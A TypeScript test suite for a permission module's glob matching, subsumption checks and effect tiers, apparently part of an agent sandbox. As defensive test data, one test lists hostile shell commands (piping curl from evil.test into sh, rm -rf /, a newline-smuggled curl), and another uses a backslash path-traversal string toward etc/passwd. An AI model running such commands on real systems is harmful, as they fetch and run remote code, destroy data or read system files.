import { Effect, Option, Schema } from "effect"
import * as FastCheck from "fast-check"
import { spawnSync } from "node:child_process"
import { describe, expect, expectTypeOf, it } from "vitest"
import * as Capability from "../src/Capability.ts"
import * as Permission from "../src/Permission.ts"

const capability = (action: Capability.Action, resource: string): Capability.Capability =>
  Capability.make(action, resource)

const uncheckedCapability = (action: Capability.Action, resource: string): Capability.Capability =>
  new Capability.Capability({ action, resource }, { disableChecks: true })

const pattern = (action: Capability.PatternAction, resource: string): Capability.CapabilityPattern =>
  new Capability.CapabilityPattern({ action, resource })

const capabilityModuleUrl = new URL("../src/Capability.ts", import.meta.url).href

const repeatedStarProgram = `
  import { Capability, CapabilityPattern, matches } from ${JSON.stringify(capabilityModuleUrl)}
  const pattern = new CapabilityPattern({ action: "fs:read", resource: "a*a*a*a*a*b" })
  const capability = new Capability({ action: "fs:read", resource: "a".repeat(10_000) }, { disableChecks: true })
  process.stdout.write(String(matches(pattern, capability)))
`

describe("Capability", () => {
  it("requires nominal values in exact and pattern-consuming signatures", () => {
    expectTypeOf<{ action: Capability.Action; resource: string }>().not.toExtend<Capability.Capability>()
    expectTypeOf<Capability.Capability>().not.toExtend<Parameters<typeof Capability.matches>[0]>()
    expectTypeOf<Capability.Capability>().not.toExtend<Parameters<typeof Capability.withinMatchBudget>[0]>()
    expectTypeOf<Capability.Capability>().not.toExtend<Parameters<typeof Capability.subsumes>[0]>()
    expectTypeOf<Capability.Capability>().not.toExtend<Parameters<typeof Capability.subsumes>[1]>()
  })

  it("refuses an exact capability in Rule.pattern instead of widening its query string", () => {
    const request = capability("net:get", "https://api.test/v1?k=1")
    const other = capability("net:get", "https://api.test/v1Xk=1")

    // @ts-expect-error An exact request is not a grant pattern.
    const invalidPattern: Permission.Rule["pattern"] = request
    expect(() => new Permission.Rule({ effect: "allow", pattern: invalidPattern }))
      .toThrow("Schema validation failed")
    // @ts-expect-error The constructor must require a pattern too.
    expect(() => new Permission.Rule({ effect: "allow", pattern: request })).toThrow("Schema validation failed")
    expect(Capability.patternFromCapability(request)).toStrictEqual(Option.none())

    // An operator may deliberately author this glob, but an exact request
    // must never enter it through Rule's nested schema construction.
    const authored = pattern("net:get", request.resource)
    expect(Permission.evaluate([[new Permission.Rule({ effect: "allow", pattern: authored })]], other)).toBe("allow")
  })

  it("uses the explicit exact-pattern conversion to construct a grant", () => {
    const request = capability("net:get", "https://api.test/v1")
    const derived = Option.getOrThrow(Capability.patternFromCapability(request))
    const rule = new Permission.Rule({ effect: "allow", pattern: derived })

    expect(Permission.evaluate([[rule]], request)).toBe("allow")
    expect(Permission.evaluate([[rule]], capability("net:get", "https://api.test/v1X"))).toBe("ask")
  })

  it("formats and parses resources containing colons", () => {
    const value = capability("net:get", "example.test:8443/api:v1")
    expect(Capability.format(value)).toBe("net:get:example.test:8443/api:v1")
    expect(Option.getOrNull(Capability.parse(Capability.format(value)))).toEqual(value)
    expect(Option.isNone(Capability.parse("unknown:action:resource"))).toBe(true)
    expect(Option.isNone(Capability.parse("fs:read"))).toBe(true)
  })

  it.each(
    [
      ["*:**", "*", "**"],
      // The bare sentinel markdown discovery emits for an undeclared flow.
      ["*", "*", "**"],
      ["*:", "*", ""],
      ["fs:*:/workspace/**", "fs:*", "/workspace/**"],
      ["fs:read:/a:b", "fs:read", "/a:b"],
      ["fs:read:", "fs:read", ""]
    ] as const
  )("parses the capability pattern %s", (input, action, resource) => {
    // `*:**` is the whole-authority envelope that one production reader could
    // not recover from the durable format.
    expect(Option.getOrThrow(Capability.parsePattern(input))).toEqual(pattern(action, resource))
  })

  it.each(["fs:read", "nope:read:/a", ":fs:read:x"])(
    "rejects the malformed capability pattern %s",
    (input) => {
      expect(Capability.parsePattern(input)).toStrictEqual(Option.none())
    }
  )

  it("round trips formatted capabilities", () => {
    const action = FastCheck.constantFrom<Capability.Action>(
      "fs:read",
      "fs:write",
      "net:get",
      "net:post",
      "model:call",
      "proc:spawn",
      "jj:status",
      "jj:diff",
      "jj:snapshot",
      "jj:restore",
      "jj:workspace-add",
      "jj:workspace-forget",
      "jj:root",
      "jj:revert",
      "jj:op-restore"
    )
    FastCheck.assert(
      FastCheck.property(action, FastCheck.string(), (selectedAction, resource) => {
        const value = capability(selectedAction, resource)
        expect(Option.getOrNull(Capability.parse(Capability.format(value)))).toEqual(value)
      })
    )
  })

  it.each([
    [pattern("fs:read", "src/*.ts"), capability("fs:read", "src/Capability.ts"), true],
    [pattern("fs:read", "src/*.ts"), capability("fs:read", "src/nested/Capability.ts"), true],
    [pattern("fs:read", "src/?.ts"), capability("fs:read", "src/a.ts"), true],
    [pattern("fs:read", "src/?.ts"), capability("fs:read", "src/ab.ts"), false],
    [pattern("fs:read", "src/**/Capability.ts"), capability("fs:read", "src/nested/Capability.ts"), true],
    // Windows is unsupported: a backslash is literal and never matches `/`.
    [pattern("fs:*", "C:/work/**"), capability("fs:write", "C:\\work\\nested\\a.ts"), false],
    [pattern("jj:*", "repository"), capability("jj:diff", "repository"), true],
    [pattern("model:*", "api.example.test/**"), capability("model:call", "api.example.test/large"), true],
    [pattern("*", "**"), capability("proc:spawn", "git status"), true],
    [pattern("proc:spawn", "npm *"), capability("proc:spawn", "npm"), true],
    // Matching never normalizes separators or folds case, including drive-shaped text.
    [pattern("fs:read", "c:/work/**"), capability("fs:read", "C:\\WORK\\nested\\a.ts"), false],
    [pattern("net:*", "example.test"), capability("net:post", "other.test"), false]
  ])("matches %o against %o", (selectedPattern, selectedCapability, expected) => {
    expect(Capability.matches(selectedPattern, selectedCapability)).toBe(expected)
  })

  it("keeps POSIX backslashes literal during resource matching", () => {
    expect(
      Capability.matches(pattern("fs:write", "/workspace/**"), capability("fs:write", "/workspace\\evil"))
    ).toBe(false)
    expect(Capability.matches(pattern("fs:read", "/a\\b"), capability("fs:read", "/a\\b"))).toBe(true)
  })

  it("treats drive-shaped resources as byte-exact text", () => {
    // Drive-shaped strings have no special matching behavior on the supported
    // POSIX hosts: neither side selects case folding or slash normalization.
    expect(Capability.matches(pattern("fs:read", "*/Work/a"), capability("fs:read", "c:/work/a"))).toBe(false)
    expect(Capability.matches(pattern("fs:read", "*/work/a"), capability("fs:read", "c:/work/a"))).toBe(true)
    expect(Capability.matches(pattern("fs:read", "A:/x"), capability("fs:read", "a:/X"))).toBe(false)
    expect(Capability.matches(pattern("fs:read", "./A:/x"), capability("fs:read", "./a:/X"))).toBe(false)
  })

  it("does not authorize a drive-shaped subtree escape by rewriting requested backslashes", () => {
    // Slash normalization used to turn this distinct POSIX filename into
    // `C:/x/../../etc/passwd`, widening the `C:/x/**` grant.
    expect(
      Capability.matches(
        pattern("fs:write", "C:/x/**"),
        capability("fs:write", "C:/x\\..\\..\\etc\\passwd")
      )
    ).toBe(false)
  })

  it("documents query-string and UTF-16 wildcard behavior", () => {
    // The URL case is the hazard that makes patternFromCapability refuse
    // resources containing metacharacters.
    expect(
      Capability.matches(
        pattern("net:get", "https://api.test/v1?k=1"),
        capability("net:get", "https://api.test/v1Xk=1")
      )
    ).toBe(true)
    expect(Capability.matches(pattern("fs:read", "a?b"), capability("fs:read", "a\u{1F600}b"))).toBe(false)
    expect(Capability.matches(pattern("fs:read", "a??b"), capability("fs:read", "a\u{1F600}b"))).toBe(true)
  })

  it("derives an exact pattern only when the resource grammar can express one", () => {
    const exact = capability("fs:read", "/workspace/readme.md")
    const derived = Option.getOrThrow(Capability.patternFromCapability(exact))

    expect(Capability.matches(derived, exact)).toBe(true)
    expect(Capability.format(derived)).toBe(Capability.format(exact))
    expect(Option.isSome(Capability.patternFromCapability(capability("fs:read", "quoted\"\nname")))).toBe(true)
  })

  it("derives an exact grant for drive-shaped resource text", () => {
    const exact = capability("fs:read", "A:/x")
    const derived = Option.getOrThrow(Capability.patternFromCapability(exact))

    expect(Capability.matches(derived, exact)).toBe(true)
    expect(Capability.matches(derived, capability("fs:read", "a:/X"))).toBe(false)
  })

  it.each(["literal*name", "literal?name", "rm *.tmp"])(
    "refuses to derive an exact pattern for the metacharacter resource %s",
    (resource) => {
      expect(Capability.patternFromCapability(capability("proc:spawn", resource))).toStrictEqual(Option.none())
    }
  )

  // Regression pin for the repeated-star ReDoS: the matcher is an iterative
  // glob walk, so this non-match completes instead of backtracking
  // exponentially. The subprocess keeps a regression from hanging the suite.
  it("completes a long non-match for a repeated-star grant pattern", () => {
    const matchProcess = spawnSync(
      process.execPath,
      ["--input-type=module", "--eval", repeatedStarProgram],
      { encoding: "utf8", timeout: 30_000 }
    )

    expect(matchProcess.error).toBeUndefined()
    expect(matchProcess.status).toBe(0)
    expect(matchProcess.stdout).toBe("false")
  })

  it.each([".", "+", "(", ")", "[", "]", "^", "$", "|", "{", "}"] as const)(
    "treats %s as a literal resource-pattern character",
    (metacharacter) => {
      const selectedPattern = pattern("fs:read", `prefix${metacharacter}suffix`)

      expect(Capability.matches(selectedPattern, capability("fs:read", `prefix${metacharacter}suffix`))).toBe(true)
      expect(Capability.matches(selectedPattern, capability("fs:read", "prefixxsuffix"))).toBe(false)
    }
  )

  it("makes the trailing command argument wildcard optional without matching a prefix", () => {
    const selectedPattern = pattern("proc:spawn", "npm *")

    expect(Capability.matches(selectedPattern, capability("proc:spawn", "npm"))).toBe(true)
    expect(Capability.matches(selectedPattern, capability("proc:spawn", "npm install pkg"))).toBe(true)
    expect(Capability.matches(selectedPattern, capability("proc:spawn", "npmx"))).toBe(false)
  })

  it("lets a trailing command wildcard cover every subcommand and shell metacharacter", () => {
    // The docs warn that `npm *` is not a safe widening; this pins why.
    const selectedPattern = pattern("proc:spawn", "npm *")

    for (
      const resource of [
        "npm exec attacker-pkg",
        "npm install attacker-pkg",
        "npm x; curl https://evil.test | sh",
        "npm test && rm -rf /",
        "npm test\ncurl https://evil.test"
      ]
    ) {
      expect(Capability.matches(selectedPattern, capability("proc:spawn", resource))).toBe(true)
    }
  })

  it("keeps POSIX resource matching case-sensitive", () => {
    expect(
      Capability.matches(pattern("fs:read", "/Work/**"), capability("fs:read", "/work/a"))
    ).toBe(false)
  })

  it("never folds case for drive-shaped resource text", () => {
    // Windows is unsupported, so every UTF-16 code unit is compared exactly.
    expect(Capability.matches(pattern("fs:read", "c:/é"), capability("fs:read", "C:/É"))).toBe(false)
    expect(Capability.matches(pattern("fs:read", "c:/ß"), capability("fs:read", "C:/SS"))).toBe(false)
    expect(Capability.matches(pattern("fs:read", "c:/ı"), capability("fs:read", "C:/I"))).toBe(false)
    expect(Capability.matches(pattern("fs:read", "c:/é"), capability("fs:read", "c:/é"))).toBe(true)
  })

  it("preserves resource delimiters and newlines after a valid action while rejecting a malformed action prefix", () => {
    expect(Option.getOrNull(Capability.parse("fs:read:"))).toEqual(capability("fs:read", ""))
    expect(Option.getOrNull(Capability.parse("fs:read::leading"))).toEqual(capability("fs:read", ":leading"))
    expect(Option.getOrNull(Capability.parse("fs:read:trailing:"))).toEqual(capability("fs:read", "trailing:"))
    expect(Option.getOrNull(Capability.parse("fs:read:line\nbreak"))).toEqual(
      capability("fs:read", "line\nbreak")
    )
    expect(Option.isNone(Capability.parse(":fs:read:resource"))).toBe(true)
  })

  it("rejects journal payloads with unknown exact and pattern actions", () => {
    const decodeCapability = Schema.decodeUnknownResult(Capability.Capability)
    const decodePattern = Schema.decodeUnknownResult(Capability.CapabilityPattern)

    expect(decodeCapability({ action: "fs:delete", resource: "/workspace/readme.md" })._tag).toBe("Failure")
    expect(decodePattern({ action: "fs:delete", resource: "/workspace/**" })._tag).toBe("Failure")
  })

  it.each([
    [pattern("fs:read", "src/a.ts"), pattern("fs:read", "src/a.ts"), true],
    [pattern("fs:*", "src/**"), pattern("fs:read", "src/nested/a.ts"), true],
    [pattern("*", "**"), pattern("jj:*", "repository"), true],
    [pattern("jj:*", "repository/**"), pattern("jj:diff", "repository/one"), true],
    [pattern("fs:read", "src/**"), pattern("fs:write", "src/a.ts"), false],
    [pattern("fs:read", "src/*"), pattern("fs:read", "src/a.ts"), false],
    [pattern("fs:read", "src/**"), pattern("fs:read", "source/a.ts"), false]
  ])("conservatively checks subsumption", (left, right, expected) => {
    expect(Capability.subsumes(left, right)).toBe(expected)
  })

  it("reads a resource as literal only when no metacharacter selects other text", () => {
    expect(Capability.isLiteralResource("src/a.ts")).toBe(true)
    expect(Capability.isLiteralResource("")).toBe(true)
    expect(Capability.isLiteralResource("src/*")).toBe(false)
    expect(Capability.isLiteralResource("secre?")).toBe(false)
  })

  it.each([
    [pattern("fs:read", "secret"), pattern("fs:read", "secret"), true],
    [pattern("fs:read", "secret"), pattern("fs:read", "public"), false],
    [pattern("fs:read", "secret"), pattern("fs:*", "secre?"), true],
    [pattern("fs:read", "a/*/x"), pattern("fs:read", "a/b/**"), true],
    [pattern("fs:read", "src/**"), pattern("fs:read", "vendor/*"), false],
    [pattern("fs:read", "a?b*c"), pattern("fs:read", "a*b"), true],
    [pattern("fs:read", "a?b"), pattern("fs:read", "b*"), false],
    [pattern("fs:read", "**"), pattern("*", "secret"), true],
    [pattern("fs:write", "**"), pattern("fs:read", "src/**"), false],
    [pattern("jj:*", "repository"), pattern("net:get", "repository"), false]
  ])("conservatively checks overlap", (left, right, expected) => {
    expect(Capability.mayOverlap(left, right)).toBe(expected)
    // Overlap is a symmetric question, unlike subsumption.
    expect(Capability.mayOverlap(right, left)).toBe(expected)
  })

  it("proves disjointness only from literal text, so an unexpandable glob keeps the overlap alive", () => {
    // `subsumes` cannot prove that `a/*/x` covers any member of `a/b/**`,
    // and reading "cannot prove" as "does not apply" is the fail-open a
    // `deny` rule must never take. `mayOverlap` answers the other question.
    expect(Capability.subsumes(pattern("fs:read", "a/*/x"), pattern("fs:read", "a/b/**"))).toBe(false)
    expect(Capability.mayOverlap(pattern("fs:read", "a/*/x"), pattern("fs:read", "a/b/**"))).toBe(true)
  })

  it("records the `*`-crosses-separators asymmetry between matches and subsumes (D10)", () => {
    // `*` compiles to `.*`, so it crosses path separators and `matches` accepts
    // a nested path. `resourceSubsumes` recognises only `**` as recursive, so
    // `subsumes` cannot prove the same coverage and errs closed.
    //
    // Not a bug — `subsumes` is deliberately conservative — but the consequence
    // is invisible at the place a grant is written: a `*` grant can never be
    // *proven* to cover a different resource, so an envelope built from `*`
    // patterns re-prompts forever. Only the identical `*` pattern is provable,
    // through equality. Recorded here rather than rediscovered, alongside the
    // sentence now on `CapabilityPattern`.
    const grant = pattern("fs:read", "src/*")
    const wanted = capability("fs:read", "src/a/b")

    expect(Capability.matches(grant, wanted)).toBe(true)
    expect(Capability.subsumes(grant, pattern("fs:read", "src/a/b"))).toBe(false)
    expect(Capability.subsumes(grant, pattern("fs:read", "src/*"))).toBe(true)
    // The provable form of the same intent.
    expect(Capability.subsumes(pattern("fs:read", "src/**"), pattern("fs:read", "src/a/b"))).toBe(true)
  })

  it("keeps matches and subsumes aligned on drive-shaped case", () => {
    // Neither predicate folds case. `subsumes` remains deliberately
    // conservative, but the former case-fold asymmetry is gone.
    const grant = pattern("fs:read", "c:/work/**")
    const requestedPattern = pattern("fs:read", "C:/work/a")
    const requestedCapability = capability("fs:read", "C:/work/a")

    expect(Capability.subsumes(grant, requestedPattern)).toBe(false)
    expect(Capability.matches(grant, requestedCapability)).toBe(false)
  })

  it("exports validators for action selectors and effect tiers", () => {
    expect(Schema.is(Capability.Action)("fs:read")).toBe(true)
    expect(Schema.is(Capability.Action)("fs:delete")).toBe(false)
    expect(Schema.is(Capability.PatternAction)("fs:*")).toBe(true)
    expect(Schema.is(Capability.PatternAction)("fs:delete")).toBe(false)
    expect(Schema.is(Capability.EffectTier)("compensable")).toBe(true)
    expect(Schema.is(Capability.EffectTier)("reversible")).toBe(false)
  })

  it("applies one resource bound to exact capabilities and patterns", () => {
    const boundary = "x".repeat(Capability.maxResourceLength)
    const overlong = `${boundary}x`
    const exactBoundary = capability("proc:spawn", boundary)

    expect(capability("fs:read", boundary).resource).toBe(boundary)
    expect(pattern("fs:read", boundary).resource).toBe(boundary)
    expect(() => capability("fs:read", overlong)).toThrow("Schema validation failed")
    expect(() => pattern("fs:read", overlong)).toThrow("Schema validation failed")
    expect(Schema.decodeUnknownResult(Capability.Capability)({ action: "fs:read", resource: overlong }))
      .toMatchObject({ failure: { _tag: "SchemaError" } })
    expect(Schema.decodeUnknownResult(Capability.CapabilityPattern)({ action: "fs:read", resource: overlong }))
      .toMatchObject({ failure: { _tag: "SchemaError" } })
    expect(Capability.parse(`fs:read:${overlong}`)).toStrictEqual(Option.none())
    expect(Capability.parsePattern(`fs:read:${overlong}`)).toStrictEqual(Option.none())
    expect(Capability.parsePattern(`*:${overlong}`)).toStrictEqual(Option.none())
    expect(Capability.patternFromCapability(uncheckedCapability("proc:spawn", overlong))).toStrictEqual(Option.none())
    expect(
      Capability.matches(Option.getOrThrow(Capability.patternFromCapability(exactBoundary)), exactBoundary)
    ).toBe(true)
  })

  it("rejects an overlong exact capability at construction", () => {
    const resource = "x".repeat(5000)
    const exit = Effect.runSyncExit(
      Effect.suspend(() => Effect.succeed(Capability.make("proc:spawn", resource)))
    )

    expect(exit).toMatchObject({ _tag: "Failure" })
  })

  it("refuses to format an action outside the closed vocabulary with a tagged error", () => {
    expect(() => Capability.format({ action: "fs:teleport" as never, resource: "x" })).toThrowError(
      expect.objectContaining({
        _tag: "@smthrs/capability/InvalidCapabilityAction",
        code: "invalid_capability_action",
        message: "Invalid capability action: fs:teleport"
      })
    )
  })

  it("refuses a formatted overlong exact capability", () => {
    const formatted = Capability.format({ action: "proc:spawn", resource: "x".repeat(5000) })
    expect(Capability.parse(formatted)).toStrictEqual(Option.none())
  })

  it("matches a short command grant against the longest valid resource", () => {
    expect(
      Capability.matches(
        pattern("proc:spawn", "node *"),
        capability("proc:spawn", `node ${"x".repeat(Capability.maxResourceLength - 5)}`)
      )
    ).toBe(true)
  })

  it("fails closed when glob matching would exceed the work budget", () => {
    const maximalPattern = pattern("fs:read", "*".repeat(Capability.maxResourceLength))
    const overBudget = uncheckedCapability("fs:read", "x".repeat(Capability.maxResourceLength + 1))

    expect(maximalPattern.resource.length * overBudget.resource.length).toBeGreaterThan(Capability.maxMatchWork)
    expect(Capability.matches(maximalPattern, overBudget)).toBe(false)
  })

  it("reports whether a pattern and capability can be matched within the budget", () => {
    const big = uncheckedCapability("proc:spawn", "x".repeat(100_000))
    const maximalPattern = pattern("proc:spawn", "x".repeat(Capability.maxResourceLength))

    expect(Capability.withinMatchBudget(pattern("proc:spawn", "*"), big)).toBe(true)
    expect(Capability.withinMatchBudget(pattern("proc:spawn", `${"x".repeat(170)}*`), big)).toBe(false)
    expect(Capability.withinMatchBudget(pattern("fs:read", `${"x".repeat(170)}*`), big)).toBe(true)
    expect(
      Capability.withinMatchBudget(
        maximalPattern,
        capability("proc:spawn", "x".repeat(Capability.maxResourceLength))
      )
    ).toBe(true)
    expect(
      Capability.withinMatchBudget(
        maximalPattern,
        uncheckedCapability("proc:spawn", "x".repeat(Capability.maxResourceLength + 1))
      )
    ).toBe(false)
  })

  it.each([
    [capability("fs:read", "anything"), "sealed"],
    [capability("net:get", "example.test"), "sealed"],
    [capability("model:call", "api.example.test/large"), "sealed"],
    [capability("jj:status", "repository"), "sealed"],
    [capability("jj:diff", "repository"), "sealed"],
    [capability("fs:write", "src/a.ts"), "compensable"],
    [capability("fs:write", "/workspace/src/a.ts"), "compensable"],
    [capability("fs:write", "../escape"), "irreversible"],
    [capability("fs:write", "/outside/a.ts"), "irreversible"],
    [capability("jj:snapshot", "repository"), "compensable"],
    [capability("jj:restore", "repository"), "compensable"],
    [capability("jj:workspace-add", "repository"), "compensable"],
    [capability("jj:workspace-forget", "repository"), "compensable"],
    [capability("jj:root", "/workspace/lane"), "sealed"],
    [capability("jj:revert", "abcdef"), "compensable"],
    [capability("jj:op-restore", "abcdef"), "compensable"],
    [capability("proc:spawn", "git status"), "irreversible"],
    [capability("net:post", "example.test"), "irreversible"],
    [capability("memory:read", "role/builder"), "sealed"],
    [capability("memory:write", "role/builder"), "irreversible"]
  ])("classifies %o as %s", (value, expected) => {
    expect(Capability.tierOf(value, { workspaceRoot: "/workspace" })).toBe(expected)
  })

  it("requires idempotency keys only for irreversible effects", () => {
    expect(Capability.requiresIdempotencyKey("sealed")).toBe(false)
    expect(Capability.requiresIdempotencyKey("compensable")).toBe(false)
    expect(Capability.requiresIdempotencyKey("irreversible")).toBe(true)
  })

  it.each(
    [
      ["/C:/Work", "/C:/Work/src/a.ts", "compensable"],
      ["/C:/Work", "/c:/work/src/a.ts", "irreversible"],
      ["/c:/", "/C:/src/a.ts", "irreversible"]
    ] as const
  )("compares drive-shaped POSIX workspace text exactly under %s", (workspaceRoot, resource, expected) => {
    // Drive syntax has no special meaning on supported hosts; lexical
    // containment compares slash-separated POSIX text exactly.
    expect(
      Capability.tierOf(capability("fs:write", resource), { workspaceRoot })
    ).toBe(expected)
  })
})
